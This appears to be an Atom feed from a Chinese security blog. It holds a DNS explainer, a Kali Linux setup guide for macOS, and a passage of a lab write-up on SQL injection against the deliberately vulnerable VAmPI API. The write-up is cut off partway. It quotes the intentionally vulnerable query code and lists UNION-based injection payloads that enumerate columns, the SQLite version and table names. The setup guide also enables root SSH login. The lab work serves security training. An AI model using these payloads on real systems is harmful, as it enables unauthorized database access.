<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yuuki&#39;s blog</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://blog.uuki.moe/atom.xml" rel="self"/>
  
  <link href="https://blog.uuki.moe/"/>
  <updated>2023-06-12T01:31:20.933Z</updated>
  <id>https://blog.uuki.moe/</id>
  
  <author>
    <name>yuuki</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域名系统 (DNS) 的工作原理和相关示例</title>
    <link href="https://blog.uuki.moe/2023/06/12/domain_name_server_works/"/>
    <id>https://blog.uuki.moe/2023/06/12/domain_name_server_works/</id>
    <published>2023-06-11T23:36:37.000Z</published>
    <updated>2023-06-12T01:31:20.933Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、根域名-Root-Domain"><a href="#1、根域名-Root-Domain" class="headerlink" title="1、根域名 (Root Domain)"></a>1、根域名 (Root Domain)</h2><p>根域名是互联网域名系统 (DNS) 中最高级别的域名。它位于域名层次结构的顶部, 没有任何上级域名。根域名在域名系统中使用一个点 (.) 来表示, 它是整个域名系统的起点。根域名由 <a href="https://www.icann.org/">Internet Corporation for Assigned Names and Numbers (ICANN)</a> 进行管理, 并确保全球的根域名服务器之间的同步和一致性。</p><p>根域名服务器 (Root Domain Server) 由一组独立的机构和组织管理。这些机构和组织分布在世界各地, 并根据 ICANN 的指导操作和维护根域名服务器的实例。截至2019年8月，全球共有1008台根域名服务器在运行。</p><h2 id="2、顶级域-Top-Level-Domain"><a href="#2、顶级域-Top-Level-Domain" class="headerlink" title="2、顶级域 (Top Level Domain)"></a>2、顶级域 (Top Level Domain)</h2><p>顶级域名 (Top Level Domain, TLD) 是域名系统中最高级别的域名分类, 其位于根域名之下, 可以对域名进行分类和组织。顶级域名通常是一个标识性的域名后缀, 用于表示不同的组织、国家或领域。例如 <code>.com</code>, <code>.org</code>, <code>.net</code></p><p>ICANN 并不会统一管理所有的顶级域, 而是交由不同的顶级域名托管商管理, 如 <code>.cn</code> 域名就由<a href="http://www.cnnic.net.cn/">中国互联网信息中心</a> (CNNIC) 来统一管理。当然一家托管商并不是只能负责管理一个顶级域, Verisign 公司就托管了 <code>.com</code>, <code>.net</code>, <code>.name</code> 等顶级域名。</p><h2 id="3、子域名-Subdomain"><a href="#3、子域名-Subdomain" class="headerlink" title="3、子域名 (Subdomain)"></a>3、子域名 (Subdomain)</h2><p>子域名将顶级域进行了更细致的划分, 顶级域名下是二级域 (Second-level Domain), 例如 <code>blog.uuki.moe</code> 中的 <code>uuki</code>  就是顶级域 <code>moe</code> 子域名。二级域名下的是三级域名, 前面示例中的 <code>blog</code> 就是 <code>uuki.moe</code> 的三级域名。</p><h2 id="4、权威域名服务器"><a href="#4、权威域名服务器" class="headerlink" title="4、权威域名服务器"></a>4、权威域名服务器</h2><p>权威域名服务器（Authoritative Name Server）是域名系统（DNS）中的一种服务器类型，它存储和提供特定域名的DNS记录信息。当需要查询特定域名的IP地址或其他DNS记录时，客户端会向权威域名服务器发送请求，以获取准确的信息。</p><p>权威域名服务器由域名所有者或其授权的管理者来建立和管理。每个域名都必须指定至少两个权威域名服务器，通常是一个主服务器和一个备份服务器。这些服务器通常由域名注册商、托管提供商或企业自己来运行和管理。</p><h2 id="4、DNS-查询工作原理"><a href="#4、DNS-查询工作原理" class="headerlink" title="4、DNS 查询工作原理"></a>4、DNS 查询工作原理</h2><p>那么弄清楚了根域 (Root Domain)、顶级域 (TLD)、子域 (Subdomain)、权威域名服务器 (Authoritative Name Server) 的基本概念和工作原理之后, 当用户在浏览器输入域名地址并访问时发生了什么?</p><ol><li>用户在浏览器中输入域名地址（例如：<a href="http://www.example.com)./">www.example.com）。</a></li><li>浏览器会首先检查本地缓存，看是否已经有该域名对应的IP地址。如果有，它会直接使用该IP地址进行下一步操作。</li><li>如果本地缓存没有该域名的IP地址，浏览器会向操作系统发起域名解析请求。</li><li>操作系统会向本地DNS解析器发送域名解析请求。</li><li>本地DNS解析器首先查看自己的缓存，如果有该域名的解析结果，它会返回给操作系统。</li><li>如果本地DNS解析器的缓存中没有该域名的解析结果，它会向<strong>根域名服务器</strong>发送查询请求。</li><li>根域名服务器会回复本地DNS解析器，提供<strong>顶级域名服务器</strong>的地址。</li><li>本地DNS解析器再次向<strong>顶级域名服务器</strong>发送查询请求。</li><li><strong>顶级域名服务器</strong> 会回复本地DNS解析器，提供<strong>次级域名服务器 (子域名)</strong> 的地址。</li><li>本地DNS解析器向<strong>次级域名服务器</strong>发送查询请求。</li><li>次级域名服务器会回复本地DNS解析器，提供与该域名相关的<strong>权威域名服务器</strong>的地址。</li><li>本地DNS解析器向<strong>权威域名服务器</strong>发送查询请求。</li><li>权威域名服务器查找并返回与该域名相关的IP地址。</li><li>本地DNS解析器将获取的IP地址返回给操作系统。</li><li>操作系统将IP地址返回给浏览器。</li><li>浏览器使用该IP地址与目标服务器建立连接。</li><li>服务器接收到浏览器的请求并返回相应的网页内容。</li><li>浏览器接收到响应后，将网页内容显示给用户。</li></ol><p>这个过程涉及到域名解析、DNS查询、缓存查找和与服务器的通信，最终实现了将域名转换为对应的IP地址，并与目标服务器建立连接，显示网页内容给用户。</p><h2 id="5、常见的-DNS-记录"><a href="#5、常见的-DNS-记录" class="headerlink" title="5、常见的 DNS 记录"></a>5、常见的 DNS 记录</h2><p>DNS（Domain Name System，域名系统）是互联网中用于将域名转换为对应 IP 地址的系统。DNS 记录是在 DNS 服务器上存储的数据项，用于指定特定域名的不同配置。下面是一些常见的 DNS 记录类型及其作用：</p><ol><li><p>A 记录（Address Record）：将域名解析为 IPv4 地址。它将域名映射到一个或多个 IP 地址，允许用户通过域名访问网站或其他网络服务。</p></li><li><p>AAAA 记录（IPv6 Address Record）：类似于 A 记录，但用于将域名解析为 IPv6 地址。它将域名映射到一个或多个 IPv6 地址。</p></li><li><p>CNAME 记录（Canonical Name Record）：用于创建别名，将一个域名指向另一个域名。当一个域名有多个 CNAME 记录时，它们指向相同的目标域名。</p></li><li><p>MX 记录（Mail Exchanger Record）：指定接收域名的电子邮件的邮件服务器。它将域名映射到一个或多个邮件服务器的地址，确保邮件能够正确地传递到相应的服务器。</p></li><li><p>TXT 记录（Text Record）：允许域名所有者存储任意文本信息。它通常用于验证域名所有权、提供安全相关的信息或记录其他文本数据。</p></li><li><p>NS 记录（Name Server Record）：指定一个域名的权威 DNS 服务器。它将域名映射到处理该域名的 DNS 服务器的地址。</p></li><li><p>SRV 记录（Service Record）：用于指定提供特定网络服务的服务器的位置和端口号。它用于识别和定位不同服务，如 VoIP、IM、自动配置等。</p></li><li><p>PTR 记录（Pointer Record）：用于进行反向 DNS 查询，将 IP 地址解析为域名。它与 A 记录相反，通过 IP 地址查找对应的域名。</p></li></ol><p>通常情况下，DNS 服务器由互联网服务提供商（ISP）、企业或组织自己来搭建和维护。大型企业可能会有自己的私有 DNS 服务器，用于管理内部网络和域名。此外，还有许多公共 DNS 服务提供商，如Google DNS、Cloudflare DNS、OpenDNS 等，它们提供了免费的公共 DNS 服务器供大众使用。这些 DNS 服务器负责解析用户的 DNS 查询并返回相应的 IP 地址或其他记录信息。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://www.ruanyifeng.com/blog/2018/05/root-domain.html">https://www.ruanyifeng.com/blog/2018/05/root-domain.html</a></li><li><a href="https://zh.wikipedia.org/wiki/%E6%A0%B9%E7%B6%B2%E5%9F%9F%E5%90%8D%E7%A8%B1%E4%BC%BA%E6%9C%8D%E5%99%A8">https://zh.wikipedia.org/wiki/根網域名稱伺服器</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%AD%90%E5%9F%9F%E5%90%8D">https://zh.wikipedia.org/wiki/子域名</a></li><li><a href="https://www.sfn.cn/news/technology/detail/476.html?navId=22">https://www.sfn.cn/news/technology/detail/476.html?navId=22</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、根域名-Root-Domain&quot;&gt;&lt;a href=&quot;#1、根域名-Root-Domain&quot; class=&quot;headerlink&quot; title=&quot;1、根域名 (Root Domain)&quot;&gt;&lt;/a&gt;1、根域名 (Root Domain)&lt;/h2&gt;&lt;p&gt;根域名是互联</summary>
      
    
    
    
    <category term="net" scheme="https://blog.uuki.moe/categories/net/"/>
    
    
    <category term="dns" scheme="https://blog.uuki.moe/tags/dns/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 下 Kali Linux 的安装配置和更新</title>
    <link href="https://blog.uuki.moe/2023/06/03/Install-kali-linux/"/>
    <id>https://blog.uuki.moe/2023/06/03/Install-kali-linux/</id>
    <published>2023-06-02T21:44:47.000Z</published>
    <updated>2023-06-11T23:48:47.654Z</updated>
    
    <content type="html"><![CDATA[<p><strong>各文件下载地址</strong></p><ul><li>VMware Fusion 下载地址: <a href="https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal-13">https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal-13</a></li><li>镜像下载地址: <a href="https://www.kali.org/get-kali/#kali-installer-images">https://www.kali.org/get-kali/#kali-installer-images</a></li><li>更新 Kali Linux: <a href="https://www.kali.org/docs/general-use/updating-kali/">https://www.kali.org/docs/general-use/updating-kali/</a></li></ul><p><strong>环境说明</strong></p><ul><li>VMware Fusion 版本: Player 版本 13.0.2 (21581413)</li><li>Kali Linux 镜像文件: kali-linux-2023.1-installer-arm64.iso </li><li>MacOS 版本: Apple M1 Pro 13.3.1</li></ul><h3 id="VMware-Fusion-安装-Kali-Linux"><a href="#VMware-Fusion-安装-Kali-Linux" class="headerlink" title="VMware Fusion 安装 Kali Linux"></a>VMware Fusion 安装 Kali Linux</h3><ol><li>在 VMWare Fusion 中选择 <code>Install disc or image</code> 安装系统</li><li>配置参数核心 <code>4</code> 个, 内存 <code>4096</code> MB, 硬盘空间 <code>30</code> G</li><li>安装完成后设置 Kali Linux 分辨率与 MacOS 相同</li><li>在设置中打开 <code>Kali HDMI Mode</code> (类似高清修复的东西)</li><li>将光标大小设置为 45</li></ol><h3 id="配置中国地区-apt-下载源"><a href="#配置中国地区-apt-下载源" class="headerlink" title="配置中国地区 apt 下载源"></a>配置中国地区 apt 下载源</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开 sources.lists 源配置文件</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释掉官方源后, 添加如下内容</span></span><br><span class="line">deb https://mirrors.ustc.edu.cn/debian/ bullseye main contrib non-free</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/debian/ bullseye main contrib non-free</span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新 apt 源</span></span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="修改用户主目录英文文件夹"><a href="#修改用户主目录英文文件夹" class="headerlink" title="修改用户主目录英文文件夹"></a>修改用户主目录英文文件夹</h3><ol><li>终端输入 <code>vim ~/.config/user-dirs.dirs</code> 打开配置文件, 按需修改即可 (下方为修改后的内容)</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XDG_DESKTOP_DIR=&quot;$HOME/Desktop&quot;</span><br><span class="line">XDG_DOWNLOAD_DIR=&quot;$HOME/Downloads&quot;</span><br><span class="line">XDG_TEMPLATES_DIR=&quot;$HOME/Templates&quot;</span><br><span class="line">XDG_PUBLICSHARE_DIR=&quot;$HOME/Public&quot;</span><br><span class="line">XDG_DOCUMENTS_DIR=&quot;$HOME/Documents&quot;</span><br><span class="line">XDG_MUSIC_DIR=&quot;$HOME/Music&quot;</span><br><span class="line">XDG_PICTURES_DIR=&quot;$HOME/Pictures&quot;</span><br><span class="line">XDG_VIDEOS_DIR=&quot;$HOME/Videos&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li>进入用户根目录, 修改文件名称为对应的名称后, 重启系统即可</li></ol><h3 id="SSH-远程连接配置"><a href="#SSH-远程连接配置" class="headerlink" title="SSH 远程连接配置"></a>SSH 远程连接配置</h3><p>在 <code>/etc/ssh/sshd_config</code> 配置中新增一行 <code>PermirRootLogin yes</code> 允许 root 登录 SSH</p><p>设置 ssh 服务开机自启动, 并重启 ssh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br><span class="line">systemctl restart ssh</span><br></pre></td></tr></table></figure><h3 id="配置共享文件夹"><a href="#配置共享文件夹" class="headerlink" title="配置共享文件夹"></a>配置共享文件夹</h3><p>如图配置即可, 真机的 <code>kali</code> 文件夹将出现在 Kali <code>/mnt/hgfs</code> 目录下</p><p>如果没有 VMware Tools 可以参考 <a href="https://blog.csdn.net/weixin_35757704/article/details/119317373">链接</a> 进行配置, 正常情况下在虚拟机安装完成后将会自动安装 VMware Tools</p><p><img src="/../assets/Install-kali-linux/image-20230603_070210.png" class="lazyload" data-srcset="/../assets/Install-kali-linux/image-20230603_070210.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>为了方便, 将共享目录软连接到用户主目录下 (后续的环境也将会在这个目录下面进行配置)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /mnt/hgfs/kali ~/kali</span><br></pre></td></tr></table></figure><h3 id="科学上网代理配置"><a href="#科学上网代理配置" class="headerlink" title="科学上网代理配置"></a>科学上网代理配置</h3><p>这里真机使用了 <a href="https://github.com/yichengchen/clashX">Clash</a> 搭配<a href="https://github.com/BoyceLig/Clash_Chinese_Patch/releases/tag/0.20.24">汉化补丁</a>, 开启了 7890 的 socks5 代理端口。在 kali 的 <code>~/.zshrc</code> 内新增内容 (将 192.168.247.1 修改为真实机器与 kali 在同一局域网内的 IP 地址) </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias pon=&quot;export https_proxy=http://192.168.247.1:7890 http_proxy=http://192.168.247.1:7890 all_proxy=socks5://192.168.247.1:7890&quot;</span><br><span class="line">alias poff=&quot;unset https_proxy; unset http_proxy; unset all_proxy&quot;</span><br></pre></td></tr></table></figure><p><img src="/../assets/Install-kali-linux/image-20230603_073719.png" class="lazyload" data-srcset="/../assets/Install-kali-linux/image-20230603_073719.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>下面的部分环境会用到 docker, docker-compose。如果拉取镜像缓慢, 可以<a href="https://help.aliyun.com/document_detail/60750.html">参考链接</a>优化速度。</p><h3 id="ARL-灯塔安装配置"><a href="#ARL-灯塔安装配置" class="headerlink" title="ARL 灯塔安装配置"></a>ARL 灯塔安装配置</h3><p>GitHub 地址: <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> docker_arl</span><br><span class="line">wget -O docker_arl/docker.zip https://github.com/TophantTechnology/ARL/releases/download/v2.5.5/docker.zip</span><br><span class="line"><span class="built_in">cd</span> docker_arl</span><br><span class="line">unzip -o docker.zip</span><br><span class="line">docker-compose pull</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>启动完成后访问 <code>https://kali-ip-address:5003</code>, 默认账号密码为 <code>admin/arlpass</code></p><p>安装完成后 <code>docker images</code> 将会新增如下几个镜像文件</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">docker images          </span><br><span class="line">REPOSITORY    TAG                        IMAGE ID       CREATED         SIZE</span><br><span class="line">tophant/arl   latest                     408fde22de0e   2 weeks ago     817MB</span><br><span class="line">mongo         4.0.27                     f83cda2e164c   18 months ago   400MB</span><br><span class="line">rabbitmq      3.8.19-management-alpine   27a2c6b36827   22 months ago   156MB</span><br></pre></td></tr></table></figure><h3 id="安装中文输入法-fcitx"><a href="#安装中文输入法-fcitx" class="headerlink" title="安装中文输入法 (fcitx)"></a>安装中文输入法 (fcitx)</h3><ol><li>输入 <code>sudo apt install fcitx</code> 安装 fcitx 输入法框架</li><li>在终端输入 <code>im-config</code> 选择 fcitx 作为默认输入法</li><li>输入 <code>sudo apt install fcitx-googlepinyin</code> 安装谷歌拼音输入法</li><li>输入 <code>reboot</code> 重启 Kali Linux</li><li>安装完成后可以在右上角打开配置设置字体大小等偏好设置</li></ol><h3 id="安装-Clash-代理工具"><a href="#安装-Clash-代理工具" class="headerlink" title="安装 Clash 代理工具"></a>安装 Clash 代理工具</h3><ol><li>进入 <a href="https://github.com/Dreamacro/clash/">https://github.com/Dreamacro/clash/</a> 下载对应操作系统 <code>.tar.gz</code> 结尾的 Clash 压缩包, 将压缩包中 clash 文件夹解压至用户根目录</li><li>进入 <a href="https://github.com/Z-Siqi/Clash-for-Windows_Chinese/releases/tag/CFW-V0.20.23_CN">https://github.com/Z-Siqi/Clash-for-Windows_Chinese&#x2F;releases&#x2F;tag&#x2F;CFW-V0.20.23_CN</a> 下载 <code>app.asar</code> 汉化补丁, 并移动到 <code>clash/resources</code> 目录</li><li>导入配置文件: 进入 <code>~/.config/clash</code> 目录, 将 <code>.yaml</code> 代理配置文件拖入即可</li></ol><h3 id="安装-Go-语言环境"><a href="#安装-Go-语言环境" class="headerlink" title="安装 Go 语言环境"></a>安装 Go 语言环境</h3><ol><li>进入 go 官网 <a href="https://go.dev/dl/">https://go.dev/dl/</a>, 搜索对应关键字 (<code>arm</code> 或 <code>amd</code>) 找到 <code>.tar.gz</code> 结尾的压缩包</li><li>解压后将 go 文件夹移动到 <code>/usr/bin</code> 目录</li><li>使用 <code>open ~/.zshrc</code> 打开 zsh 配置文件, 添加如下内容, 保存后退出 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export GOPATH=/usr/bin/go</span><br><span class="line">export PATH=$PATH:$GOROOT/bin:$GOPATH/bin</span><br></pre></td></tr></table></figure></li><li>命令行输入 <code>source ~/.zshrc</code> 重新加载 zsh 配置文件即可</li></ol><h3 id="更新-Kali-Linux"><a href="#更新-Kali-Linux" class="headerlink" title="更新 Kali Linux"></a>更新 Kali Linux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前版本</span></span><br><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux secuuki 6.1.0-kali5-arm64 <span class="comment">#1 SMP Debian 6.1.12-1kali2 (2023-02-23) aarch64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新版本</span></span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt full-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启系统</span></span><br><span class="line">$ reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看更新后版本号</span></span><br><span class="line">$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux secuuki 6.1.0-kali9-arm64 <span class="comment">#1 SMP Debian 6.1.27-1kali1 (2023-05-12) aarch64 GNU/Linux</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;各文件下载地址&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VMware Fusion 下载地址: &lt;a href=&quot;https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal</summary>
      
    
    
    
    <category term="ops" scheme="https://blog.uuki.moe/categories/ops/"/>
    
    
    <category term="Kali Linux" scheme="https://blog.uuki.moe/tags/Kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>Lab - VAmPI - SQL Injection</title>
    <link href="https://blog.uuki.moe/2023/05/31/VAmPI-sql-injection/"/>
    <id>https://blog.uuki.moe/2023/05/31/VAmPI-sql-injection/</id>
    <published>2023-05-30T19:50:16.000Z</published>
    <updated>2023-06-12T01:31:35.217Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/erev0s/VAmPI">VAmPI</a> 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 <a href="https://erev0s.com/blog/vampi-vulnerable-api-security-testing/">https://erev0s.com/blog/vampi-vulnerable-api-security-testing/</a> 可以看到更加全面的介绍。</p><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>有三种搭建环境的方式, 分别是 Python, docker, docker-compose。本文使用 Python 搭建。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/erev0s/VAmPI.git</span><br><span class="line"><span class="built_in">cd</span> VAmPI/</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>将环境拉倒本地后可以直接使用 <code>python3 app.py</code> 运行。在 <code>openapi_specs</code> 目录下有一个 <code>openapi3.yml</code>, 可以用于在 <a href="https://editor.swagger.io/">swagger editor</a> 或 Postman 等工具生成 API 文档。</p><p>为了避免与较新版本的 MacOS AirPlay Receiver 的端口冲突, 需要修改 <code>app.py</code> 与 <code>openapi3.yml</code> 内的端口号为 <code>5001</code></p><p>使用 <code>python3 app.py</code> 启动服务后浏览器访问 <code>http://10.0.0.100:5001/</code>。在 Postman 导航栏选择 <strong>File</strong> -&gt; <strong>Import</strong> 导入 <code>openapi3.yml</code> 配置文件开始测试。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>导致 SQL 注入的查询用户名接口为 <code>/users/v1/&#123;username&#125;</code>。功能函数 <code>get_user</code> 代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> vuln:  <span class="comment"># SQLi Injection</span></span><br><span class="line">        user_query = <span class="string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27;&quot;</span></span><br><span class="line">        query = db.session.execute(text(user_query))</span><br><span class="line">        ret = query.fetchone()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            fin_query = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#x27;</span> % (ret[<span class="number">1</span>], ret[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fin_query = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fin_query = User.query.filter_by(username=username).first()</span><br><span class="line">    <span class="keyword">return</span> fin_query</span><br></pre></td></tr></table></figure><p>靶场 SQL 环境使用的是 SQLite 数据库, 需要注意 SQLite 没有库这个概念的, 查询语句中不需要指定数据库。</p><p>查询语句 <code>user_query = f&quot;SELECT * FROM users WHERE username = &#39;&#123;username&#125;&#39;&quot;</code> 为<strong>字符型查询</strong>, 注入时使用单引号闭合。</p><p>查询结果 <code>fin_query = &#39;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#39; % (ret[1], ret[3])</code> 使用键 1 和 3 的位置作为响应结果, 故<strong>数据回显位</strong>在 2 和 4。</p><h3 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h3><p>当用户存在将返回 <code>username</code>, <code>email</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>当用户不存在 <code>message</code> 将返回 <code>User not found</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fail&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>单引号 <code>&#39;</code> 报错, 添加注释符号后页面正常显示, 判断注入点存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:5001/users/v1/1       # 正常</span><br><span class="line">http://localhost:5001/users/v1/1&#x27;      # 报错</span><br><span class="line">http://localhost:5001/users/v1/1&#x27; --+  # 正常</span><br></pre></td></tr></table></figure><p><img src="/../assets/VAmPI-sql-injection/image-20230601_061815.png" class="lazyload" data-srcset="/../assets/VAmPI-sql-injection/image-20230601_061815.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>在这里页面回显了查询语句 <code>SELECT * FROM users WHERE username = &#39;1&#39;&#39;</code> 明确指出这是字符型的注入点, 省略 <strong><a href="https://pentestnote.uuki.moe/pentesting-web/sql-injection">确定闭合方式</a></strong> 这一步骤</p><h3 id="判断查询结果列数"><a href="#判断查询结果列数" class="headerlink" title="判断查询结果列数"></a>判断查询结果列数</h3><p>使用 ORDER BY 语句判断查询结果列数。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 4 --+  # 正常</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 5 --+  # 正常</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 6 --+  # 报错</span><br></pre></td></tr></table></figure><p><img src="/../assets/VAmPI-sql-injection/image-20230601_063959.png" class="lazyload" data-srcset="/../assets/VAmPI-sql-injection/image-20230601_063959.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>当排序语句为 <code>ORDER BY 6</code> 时, 页面将报错, 判断查询结果为 5 列。</p><h3 id="判断数据回显位"><a href="#判断数据回显位" class="headerlink" title="判断数据回显位"></a>判断数据回显位</h3><p>使用 <code>UNION</code> 联合查询判断数据回显位。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,2,3,4,5 --+</span><br></pre></td></tr></table></figure><p>本身 <code>username = 1</code> 结果并不存在, 服务器将会返回 UNION 查询语句的结果, 响应结果中包含 2, 4 , 说明 2 和 4 的位置是数据回显位。</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h3><p>使用 sqlite 查看版本信息函数 <code>sqlite_version()</code> 查询数据库版本信息</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,sqlite_version(),3,4,5 FROM sqlite_schema --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601101335</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,sqlite_version(),3,4,5%20FROM%20sqlite_schema%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.39.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="检索数据库数据"><a href="#检索数据库数据" class="headerlink" title="检索数据库数据"></a>检索数据库数据</h3><h4 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type=&#x27;table&#x27; --+</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601102601</span></span><br><span class="line"><span class="comment">// 